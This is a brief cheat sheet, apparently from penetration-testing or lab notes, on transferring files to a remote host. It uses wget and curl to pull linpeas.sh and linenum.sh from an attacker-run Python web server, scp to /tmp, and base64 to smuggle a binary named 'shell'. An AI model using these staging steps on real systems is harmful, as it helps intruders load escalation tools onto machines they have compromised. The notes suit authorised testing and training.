# Transfering Files

**Start a local webserver**
```bash
python3 -m http.server 8000
```

**Download a file on the remote server from our local machine**
```bash
wget http://10.10.14.1:8000/linpeas.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

**Transfer a file to the remote server with scp (requires SSH access)**
```bash
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

**Base64 Encoding**
```bash
# Convert a file to base64
base64 shell -w 0

# Convert a file from base64 back to its orig
echo f0VMR...SNIO...InmDwU | base64 -d > shell

# Check the file's md5sum to ensure it converted correctly
md5sum shell
```
